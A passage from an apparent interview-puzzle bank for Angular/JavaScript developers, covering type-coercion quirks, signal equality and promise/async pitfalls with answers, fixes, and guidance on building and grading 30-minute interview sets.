> "What does each line print?"
- **Answer:** `2`, `'53'`, `5`, `NaN`, `10`, `''`, `'[object Object]'`, `10`.
- **Mechanics:** `+` is the **only** arithmetic operator that doubles as concatenation: if after ToPrimitive either operand is a string, you get **string joining**. Every other operator (`-`, `*`, `/`) coerces both operands to **number**.
  - `5 + null` → `null` → `0` → `5`; `5 + undefined` → `undefined` → `NaN`.
  - `[] + []` → ToPrimitive of an array gives `''` → `'' + ''` = `''`.
  - `[] + {}` → `'' + '[object Object]'`.
  - `1 + '1' - 1` → `'11'` → `'11' - 1` → `10`.
- **Follow-up:** "what about `{} + []` typed into the console?" → at the top level `{}` parses as an **empty block**, leaving the unary `+[]` → `0`. Inside an expression (`console.log({} + [])`) it's `'[object Object]'`. That's a **parsing** difference, not coercion.

### P23.2 ⭐ — `sort()` without a comparator
```javascript
const nums = [10, 9, 1, 100];
const sorted = nums.sort();

console.log(sorted);
console.log(nums);
```
> "What do both lines print?"
- **Answer:** both print **`[1, 10, 100, 9]`**.
- **Two separate problems:**
  1. **The default `sort` compares strings:** without a comparator, elements are converted to strings and compared by UTF-16 code units → `'10' < '9'`. Fix: `.sort((a, b) => a - b)`.
  2. **`sort` mutates the original** and returns **the same** array: `sorted === nums`. That's why the second log shows the sorted array too.
- **Why this is an Angular bug, not trivia:** sorting an array that came from an `@Input` or a `signal()` in place changes it **without changing the reference** → OnPush won't notice (P2.1), the signal won't notify (P3.1), and the parent component suddenly has reordered data.
- **Fix:** `[...nums].sort((a, b) => a - b)` or `nums.toSorted((a, b) => a - b)` (ES2023 — non-mutating). Likewise `toReversed`, `toSpliced`, `with`.

### P23.3 ⭐⭐ — `==` and comparison
```javascript
console.log(null == undefined);
console.log(null == 0);
console.log(null >= 0);
console.log(NaN === NaN);
console.log('' == 0);
console.log('0' == false);
console.log([] == false);
console.log([1] == 1);
```
> "What does each line print? Explain lines 2 and 3 together in particular."
- **Answer:** `true`, `false`, `true`, `false`, `true`, `true`, `true`, `true`.
- **The key pair — `null == 0` is `false` but `null >= 0` is `true`.** They run **two different algorithms**:
  - `==` has a **special rule**: `null` equals only `null` and `undefined`, and performs **no numeric coercion at all**.
  - Relational operators (`<`, `>`, `<=`, `>=`) have no such exception — they go through **ToNumber**, where `null → 0`, so `0 >= 0` is `true`.
  - The curiosity that falls out: `null` is simultaneously "not equal to zero", "not greater than zero", and "greater than or equal to zero".
- **The rest is plain ToNumber:** `'' → 0`; `false → 0` and `'0' → 0`; `[] → '' → 0`; `[1] → '1' → 1`.
- **Practice:** `===` everywhere; the one defensible `==` is `x == null` as a compact "null or undefined" check — precisely because of the special rule in line 1.
- **Follow-up:** "and `NaN`?" → it equals nothing, including itself; test with `Number.isNaN(x)` (not the global `isNaN`, which coerces first) or `Object.is(x, NaN)` — see P23.5.

### P23.4 ⭐⭐ — Truthiness in a template
```typescript
@Component({
  template: `
    @if (count) { <span class="badge">{{ count }}</span> }
    <p>{{ title || 'Untitled' }}</p>
    <p>{{ discount ?? 'none' }}</p>
    @if (items) { <span>Has items</span> }
  `,
})
class SummaryComponent {
  count = 0;
  title = '';
  discount = 0;
  items: string[] = [];
}
```
> "What renders? Three of the four lines behave differently from what the author intended."
- **Answer:**
  - `@if (count)` → the badge is **hidden**: `0` is falsy. But "0 orders" is a legitimate state you usually want to show. Correct: `@if (count !== null)` or `@if (count > 0)` — depending on intent, but **explicitly**.
  - `title || 'Untitled'` → `''` is falsy → **"Untitled"**. If the empty string was deliberate, `||` just ate it. Correct: `title ?? 'Untitled'`.
  - `discount ?? 'none'` → `0` is **not nullish** → renders **`0`**. This one is right, and it shows the difference: `??` reacts only to `null`/`undefined`, `||` to anything falsy.
  - `@if (items)` → **an empty array is truthy** → "Has items" always shows. Correct: `@if (items.length)`.
- **Rule:** `||` is safe for defaults only where `0`, `''` and `false` are **not** valid values. Everywhere else, `??`.
- **🚩:** doesn't see that `[]` and `{}` are truthy; treats `??` as "just a newer synonym" for `||`.

### P23.5 ⭐⭐ — `Object.is`, `===` and signal equality
```typescript
console.log(NaN === NaN, Object.is(NaN, NaN));
console.log(0 === -0, Object.is(0, -0));

const a = signal(NaN);
a.set(NaN);

const b = signal(0);
b.set(-0);
```
> "What do the two `console.log`s print? And which of the two `set` calls notifies dependents?"
- **Answer:** `false true`, then `true false`.
  - `NaN === NaN` → **`false`** (the only value not equal to itself), but `Object.is(NaN, NaN)` → **`true`**.
  - `0 === -0` → **`true`**, but `Object.is(0, -0)` → **`false`** (different bit patterns).
- **Signals use `Object.is`** as the default `equal`, therefore:
  - `a.set(NaN)` over `NaN` → `Object.is` says equal → **no notification**.
  - `b.set(-0)` over `0` → `Object.is` says different → **notifies**, even though `0 === -0`.
- **Both outcomes are counterintuitive**, and both follow directly from `Object.is` semantics, not from "Angular magic".
- **Practical takeaway:** when domain equality differs from reference equality (objects, dates, `NaN` in numeric fields), supply a **custom `equal`**: `signal(value, { equal: myCompare })`.
- **Follow-up:** "where else does `Object.is` show up in Angular?" → the CD verification pass (`ExpressionChangedAfterItHasBeenChecked`, P2.4) and input comparison for OnPush (P2.1) — which is why object mutation goes unnoticed.

---

## 24. Promises & async/await

> A section beyond the theory bank. The event loop was already covered in section 1 — this is about promise semantics: where the error hides, what `await` actually does, and why "in parallel" doesn't mean "independent".

### P24.1 ⭐ — `try/catch` without `await`
```typescript
async load(): Promise<Data | null> {
  try {
    return this.api.get();
  } catch {
    return null;
  }
}
```
> "`this.api.get()` rejects. What does `load()` return?"
- **Answer:** **not `null`** — `load()` returns a **rejected promise**, and the `catch` here **never runs**.
- **Mechanics:** `try/catch` catches **synchronous** exceptions within its block. Here we simply **return a promise** — the function completes successfully, and the rejection happens **later**, outside the `try`.
- **Fix:** `return await this.api.get();` — `await` unwraps the promise **inside** the `try`, turning the rejection into an exception the block can see.
- **Senior nuance:** this is exactly why the `no-return-await` lint rule carves out an exception for `try` blocks — there `return await` isn't redundant, it's required.

### P24.2 ⭐⭐ — `forEach` with `async`
```typescript
async saveAll(items: Item[]) {
  items.forEach(async item => {
    await this.api.save(item);
  });

  this.done = true;
  console.log('all saved');
}
```
> "What's wrong? Three consequences."
- **Answer:** `forEach` **ignores** the returned promises — it waits for nothing.
  1. **`done = true` and the log fire immediately**, before a single item has been saved.
  2. **Errors are lost**: a rejection inside the callback belongs to no one → `unhandledrejection`, not your `catch`.
  3. **No sequencing and no concurrency control**: every request starts at once; with 5,000 items that takes down both the browser and the backend.
- **Fixes:**
  - sequential: `for (const item of items) { await this.api.save(item); }`
  - parallel, awaited: `await Promise.all(items.map(i => this.api.save(i)))`
  - bounded concurrency: RxJS `from(items).pipe(mergeMap(i => this.api.save(i), 5))` — at most 5 at a time.
- **Follow-up:** "what about `map` with `async` and no `await`?" → it returns an **array of promises**, not values — the usual cause of `[object Promise]` in a template.

### P24.3 ⭐⭐ — `Promise.all` and fail-fast
```typescript
const [users, orders, stats] = await Promise.all([
  this.api.users(),
  this.api.orders(),
  this.api.stats(),
]);
```
> "`stats()` fails with a 500, the other two succeed. What does the user see, and what happens to those two requests?"
- **Answer:** the user sees **nothing** — `Promise.all` rejects on the **first** failure, `await` throws, and `users`/`orders` are discarded even though their data arrived.
- **The important nuance:** the other requests are **not cancelled**. They finish quietly in the background and their results go nowhere. `Promise` has **no cancellation** — this isn't RxJS.
- **Fix, by intent:**
  - partial data is useful → **`Promise.allSettled`**, handling each result by status;
  - all-or-nothing → `Promise.all` is right, but you need a `try/catch` and a clear error state;
  - genuine **cancellation** → `AbortController` for fetch, or RxJS (`forkJoin` + `takeUntilDestroyed`, `switchMap`).
- **Follow-up:** "difference between `any` and `race`?" → `Promise.any` is the first **success** (rejects only if all fail); `Promise.race` is the first to **settle either way**, errors included.

### P24.4 ⭐⭐ — A promise created too early
```typescript
async init() {
  const config = this.api.loadConfig();

  await this.showSplashScreen(2000);

  try {
    this.config = await config;
  } catch {
    this.config = DEFAULTS;
  }
}
```
> "`loadConfig()` rejects immediately. The `catch` does run. So why does the console still say `Unhandled promise rejection`, and why isn't that cosmetic?"
- **Answer:** your `catch` really does run — the rejection is **stored** on the promise and delivered once someone finally subscribes. But the browser checks "does this rejected promise have a handler" **at the end of the current microtask checkpoint**, and we attach ours two seconds later. By then the **`unhandledrejection` event has already fired**.
- **Why it isn't cosmetic:** the global `unhandledrejection` handler is rarely empty — Sentry/analytics record a phantom error, and some teams wire it to a forced logout or a global error banner. The app reacts to a problem the code **handled correctly**.
- **Fixes:** attach a handler **at creation** (`const config = this.api.loadConfig().catch(() => DEFAULTS);`), or don't create the promise before you're ready to await it.
- **Bonus:** when a handler is added later, the browser fires the paired **`rejectionhandled`** event — precisely so you can retract a previously reported error.

---

## Ready-made 30-minute sets

Pick **one** set to match the candidate's profile — 5–6 puzzles, ~4 min each including follow-ups.

| Set | Puzzles | Who it filters out |
|---|---|---|
| **Angular core** | P2.1, P2.3, P2.5, P4.1, P14.3, P15.3 | Someone who *uses* Angular but doesn't know how it decides *when* and *what* to check |
| **Reactivity / RxJS** | P5.1, P5.4, P16.1, P16.3, P6.4, P3.1 | Someone who knows operators by name but can't spot leaks and races |
| **JS fundamentals** | P22.1, P22.2, P22.3, P17.1, P17.3, P17.5 | Someone who learned the framework instead of the language |
| **Type coercion** | P23.1, P23.2, P23.3, P23.4, P23.5, P9.2 | Someone who "just writes `===` everywhere" without knowing what they're defending against |
| **Async** | P1.2, P1.5, P24.1, P24.2, P24.3, P24.4 | Someone for whom `async/await` means "so it doesn't block" |
| **HTML / CSS / a11y** | P20.6, P20.3, P20.4, P19.3, P21.3, P21.4 | The "full-stack front-ender" for whom markup is "not really my thing" |
| **Production experience (mixed)** | P6.4, P10.2, P13.1, P15.2, P17.4, P20.5 | Someone who hasn't watched their own bugs play out under real load |

**10-minute screen (3 puzzles):** P2.1 → P17.1 → P23.2. All three missed — no need to dig further.

---

## How to read the answers

- **Mid:** states the **result**, explains the mechanics roughly, and guesses on "what if…" follow-ups. Often knows the **fix** without the **cause** ("you need `bind` here", "you need `shareReplay` here").
- **Senior:** explains **why**, distinguishes near-neighbours (`markForCheck` vs `detectChanges`, `share` vs `shareReplay`, `==` vs `>=` for `null`, `||` vs `??`, `preload` vs `prefetch`), and raises edge cases unprompted.
- **Senior+ / staff:** immediately sees the **trade-off** and how this bug reaches production; offers several fixes and argues for the one they'd pick; reasons their way through even where they don't recall the details; says "I don't know" where they don't — a stronger signal than confident bluffing.

> **On the blank answer.** A puzzle where the candidate says "I don't remember the exact order, but reasoning it through: …" and arrives at the right answer by logic is a **pass**. We're not hiring memory; we're hiring a model of the world.
